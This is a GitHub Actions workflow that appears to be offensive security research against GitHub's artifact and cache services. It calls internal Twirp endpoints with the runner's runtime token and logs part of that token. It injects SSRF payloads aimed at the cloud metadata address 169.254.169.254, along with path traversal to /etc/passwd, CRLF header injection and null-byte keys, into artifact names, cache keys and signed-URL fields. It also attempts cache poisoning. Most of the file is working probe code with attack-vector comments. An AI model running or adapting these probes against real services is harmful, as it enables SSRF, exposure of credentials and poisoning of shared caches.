name: Artifact Cache SSRF Deep Research

on:
  workflow_dispatch:

permissions:
  contents: read
  actions: read
  id-token: write

jobs:
  probe-artifact-service:
    runs-on: ubuntu-latest
    steps:
      - name: Probe artifact service via JS action
        uses: actions/github-script@v7
        with:
          script: |
            const http = require('@actions/http-client');
            
            // These env vars are available inside JS actions
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            const cacheUrl = process.env.ACTIONS_CACHE_URL;
            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
            const idTokenUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
            const idTokenToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
            
            console.log("=== RUNTIME ENVIRONMENT ===");
            console.log("ACTIONS_RESULTS_URL:", resultsUrl);
            console.log("ACTIONS_CACHE_URL:", cacheUrl);
            console.log("ACTIONS_RUNTIME_TOKEN (first 50):", runtimeToken?.substring(0, 50) + "...");
            console.log("ACTIONS_ID_TOKEN_REQUEST_URL:", idTokenUrl);
            
            // Create HTTP client with auth
            const client = new http.HttpClient('ssrf-test', [], {
              headers: {
                'Authorization': `Bearer ${runtimeToken}`,
                'Content-Type': 'application/json'
              }
            });
            
            // Test artifact Twirp endpoints
            if (resultsUrl) {
              console.log("\n=== ARTIFACT SERVICE PROBING ===");
              
              const endpoints = [
                { path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', body: {} },
                { path: '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', body: { name: 'test' } },
                { path: '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL', body: { name: 'test' } },
                { path: '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', body: { key: 'test', version: 'test' } },
                { path: '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', body: { key: 'test', version: 'test' } },
              ];
              
              for (const ep of endpoints) {
                const url = new URL(ep.path, resultsUrl).href;
                console.log(`\nTesting: ${url}`);
                try {
                  const res = await client.post(url, JSON.stringify(ep.body));
                  const body = await res.readBody();
                  console.log(`Status: ${res.message.statusCode}`);
                  console.log(`Response: ${body.substring(0, 500)}`);
                } catch (e) {
                  console.log(`Error: ${e.message}`);
                }
              }
            }

      - name: Test artifact creation with SSRF payload
        uses: actions/github-script@v7
        with:
          script: |
            const http = require('@actions/http-client');
            
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
            
            const client = new http.HttpClient('ssrf-test', [], {
              headers: {
                'Authorization': `Bearer ${runtimeToken}`,
                'Content-Type': 'application/json'
              }
            });
            
            console.log("=== ARTIFACT NAME INJECTION ===");
            
            // Try various SSRF payloads in artifact names
            const payloads = [
              { name: "http://169.254.169.254/latest/meta-data/", desc: "Direct IMDS URL" },
              { name: "../../../etc/passwd", desc: "Path traversal" },
              { name: "test\nX-Forwarded-For: 169.254.169.254", desc: "Header injection" },
              { name: "test?redirect=http://169.254.169.254/", desc: "Query injection" },
              { name: "@169.254.169.254/latest/meta-data/", desc: "At-trick" },
            ];
            
            for (const payload of payloads) {
              const url = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', resultsUrl).href;
              console.log(`\n--- Testing: ${payload.desc} ---`);
              console.log(`Payload: ${payload.name}`);
              try {
                const res = await client.post(url, JSON.stringify({
                  workflow_run_backend_id: process.env.GITHUB_RUN_ID,
                  workflow_job_run_backend_id: "test",
                  name: payload.name,
                  version: 4
                }));
                const body = await res.readBody();
                console.log(`Status: ${res.message.statusCode}`);
                console.log(`Response: ${body.substring(0, 300)}`);
              } catch (e) {
                console.log(`Error: ${e.message}`);
              }
            }

  probe-cache-service:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Probe cache service via JS action
        uses: actions/github-script@v7
        with:
          script: |
            const http = require('@actions/http-client');
            
            const cacheUrl = process.env.ACTIONS_CACHE_URL || process.env.ACTIONS_RESULTS_URL;
            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
            
            console.log("=== CACHE SERVICE PROBING ===");
            console.log("Cache URL:", cacheUrl);
            
            if (!cacheUrl) {
              console.log("No cache URL available");
              return;
            }
            
            const client = new http.HttpClient('ssrf-test', [], {
              headers: {
                'Authorization': `Bearer ${runtimeToken}`,
                'Accept': 'application/json;api-version=6.0-preview.1'
              }
            });
            
            // Test v1 cache API
            const v1Endpoints = [
              '_apis/artifactcache/caches',
              '_apis/artifactcache/cache?keys=test&version=test',
            ];
            
            console.log("\n--- V1 Cache API ---");
            for (const ep of v1Endpoints) {
              const url = new URL(ep, cacheUrl).href;
              console.log(`Testing: ${url}`);
              try {
                const res = await client.get(url);
                const body = await res.readBody();
                console.log(`Status: ${res.message.statusCode}`);
                console.log(`Response: ${body.substring(0, 300)}`);
              } catch (e) {
                console.log(`Error: ${e.message}`);
              }
            }
            
            // Test v2 cache Twirp API
            const v2Endpoints = [
              { path: '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', body: { key: 'test', version: 'v1' } },
              { path: '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', body: { key: 'test', version: 'v1' } },
              { path: '/twirp/github.actions.results.api.v1.CacheService/ListCacheEntries', body: {} },
            ];
            
            console.log("\n--- V2 Cache Twirp API ---");
            for (const ep of v2Endpoints) {
              const url = new URL(ep.path, cacheUrl).href;
              console.log(`Testing: ${url}`);
              try {
                const res = await client.post(url, JSON.stringify(ep.body), {
                  'Content-Type': 'application/json'
                });
                const body = await res.readBody();
                console.log(`Status: ${res.message.statusCode}`);
                console.log(`Response: ${body.substring(0, 300)}`);
              } catch (e) {
                console.log(`Error: ${e.message}`);
              }
            }

      - name: Test cache key injection
        uses: actions/github-script@v7
        with:
          script: |
            const http = require('@actions/http-client');
            
            const cacheUrl = process.env.ACTIONS_CACHE_URL || process.env.ACTIONS_RESULTS_URL;
            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
            
            console.log("=== CACHE KEY INJECTION ===");
            
            const client = new http.HttpClient('ssrf-test', [], {
              headers: {
                'Authorization': `Bearer ${runtimeToken}`,
                'Accept': 'application/json;api-version=6.0-preview.1'
              }
            });
            
            // Try SSRF payloads in cache keys
            const payloads = [
              "http://169.254.169.254/latest/meta-data/",
              "../../../etc/passwd",
              "test\r\nX-Forwarded-For: 169.254.169.254",
              "test%00http://169.254.169.254/",
            ];
            
            for (const key of payloads) {
              const encodedKey = encodeURIComponent(key);
              const url = new URL(`_apis/artifactcache/cache?keys=${encodedKey}&version=test`, cacheUrl).href;
              console.log(`\nTesting key: ${key}`);
              console.log(`URL: ${url}`);
              try {
                const res = await client.get(url);
                const body = await res.readBody();
                console.log(`Status: ${res.message.statusCode}`);
                console.log(`Response: ${body.substring(0, 200)}`);
              } catch (e) {
                console.log(`Error: ${e.message}`);
              }
            }

  probe-signed-url-ssrf:
    runs-on: ubuntu-latest
    steps:
      - name: Create artifact and analyze signed URL
        uses: actions/github-script@v7
        with:
          script: |
            const artifact = require('@actions/artifact');
            const fs = require('fs');
            const path = require('path');
            const http = require('@actions/http-client');
            
            console.log("=== SIGNED URL ANALYSIS ===");
            
            // Create a test file
            const testDir = '/tmp/artifact-test';
            fs.mkdirSync(testDir, { recursive: true });
            fs.writeFileSync(path.join(testDir, 'test.txt'), 'test content');
            
            const client = new artifact.DefaultArtifactClient();
            
            try {
              // Upload and capture the signed URL
              console.log("Uploading artifact...");
              const result = await client.uploadArtifact(
                'ssrf-signed-url-test',
                [path.join(testDir, 'test.txt')],
                testDir
              );
              console.log("Upload result:", JSON.stringify(result));
              
              // Now try to get a signed URL with SSRF payload
              const resultsUrl = process.env.ACTIONS_RESULTS_URL;
              const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
              
              if (resultsUrl) {
                const httpClient = new http.HttpClient('ssrf-test', [], {
                  headers: {
                    'Authorization': `Bearer ${runtimeToken}`,
                    'Content-Type': 'application/json'
                  }
                });
                
                // Try to request signed URL with manipulated parameters
                const signedUrlPayloads = [
                  { workflow_run_backend_id: "1", name: "test", redirect_url: "http://169.254.169.254/" },
                  { workflow_run_backend_id: "../../../", name: "test" },
                  { workflow_run_backend_id: "1", name: "http://169.254.169.254/test.zip" },
                ];
                
                for (const payload of signedUrlPayloads) {
                  const url = new URL('/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL', resultsUrl).href;
                  console.log(`\nTesting signed URL payload:`, JSON.stringify(payload));
                  try {
                    const res = await httpClient.post(url, JSON.stringify(payload));
                    const body = await res.readBody();
                    console.log(`Status: ${res.message.statusCode}`);
                    console.log(`Response: ${body.substring(0, 500)}`);
                    
                    // If we got a signed URL, analyze it
                    if (body.includes('http')) {
                      console.log("SIGNED URL DETECTED - analyzing...");
                      const parsed = JSON.parse(body);
                      if (parsed.signed_url) {
                        console.log("Signed URL:", parsed.signed_url);
                        // Could potentially modify this URL for SSRF
                      }
                    }
                  } catch (e) {
                    console.log(`Error: ${e.message}`);
                  }
                }
              }
            } catch (e) {
              console.log("Error:", e.message);
            }

  probe-blob-storage-ssrf:
    runs-on: ubuntu-latest
    steps:
      - name: Analyze blob storage URLs
        uses: actions/github-script@v7
        with:
          script: |
            const http = require('@actions/http-client');
            
            console.log("=== BLOB STORAGE SSRF ANALYSIS ===");
            
            // Cache/Artifact downloads go to Azure Blob Storage
            // Format: https://*.blob.core.windows.net/...
            // The SDK downloads from this URL - can we manipulate it?
            
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
            
            // Check what happens with redirect-based SSRF
            console.log("\n--- Testing redirect behaviors ---");
            
            // The download flow is:
            // 1. Request signed URL from GitHub
            // 2. Get back Azure Blob URL
            // 3. SDK fetches from Azure Blob URL
            
            // Attack vectors:
            // 1. If the signed URL generation is vulnerable, we might get arbitrary URLs
            // 2. If Azure Blob follows redirects, we could poison cache
            // 3. If the SDK doesn't validate URL origin, we could inject
            
            const client = new http.HttpClient('ssrf-test', [], {
              headers: {
                'Authorization': `Bearer ${runtimeToken}`,
                'Content-Type': 'application/json'
              }
            });
            
            // Test if we can create a cache entry that points to arbitrary URL
            if (resultsUrl) {
              // Try to finalize a cache entry with a manipulated URL
              const manipulatedPayloads = [
                {
                  key: "ssrf-test",
                  version: "v1",
                  size_bytes: "100",
                  // Attempt to inject URL
                  archive_location: "http://169.254.169.254/latest/meta-data/"
                },
                {
                  key: "ssrf-test",
                  version: "v1",
                  // Try URL in key
                  upload_url: "http://169.254.169.254/"
                }
              ];
              
              for (const payload of manipulatedPayloads) {
                const url = new URL('/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', resultsUrl).href;
                console.log(`\nTesting: ${JSON.stringify(payload)}`);
                try {
                  const res = await client.post(url, JSON.stringify(payload));
                  const body = await res.readBody();
                  console.log(`Status: ${res.message.statusCode}`);
                  console.log(`Response: ${body.substring(0, 300)}`);
                } catch (e) {
                  console.log(`Error: ${e.message}`);
                }
              }
            }

  test-actions-cache-ssrf:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Create poisoned cache directory
        run: |
          mkdir -p /tmp/cache-poison
          echo "SSRF test payload" > /tmp/cache-poison/payload.txt
          
      - name: Test cache with SSRF key
        uses: actions/cache@v4
        id: cache-ssrf
        with:
          path: /tmp/cache-poison
          key: http://169.254.169.254/latest/meta-data/-${{ github.run_id }}
        continue-on-error: true
        
      - name: Check cache logs
        run: |
          echo "Cache hit: ${{ steps.cache-ssrf.outputs.cache-hit }}"
          echo "Checking if any network requests were made to IMDS..."
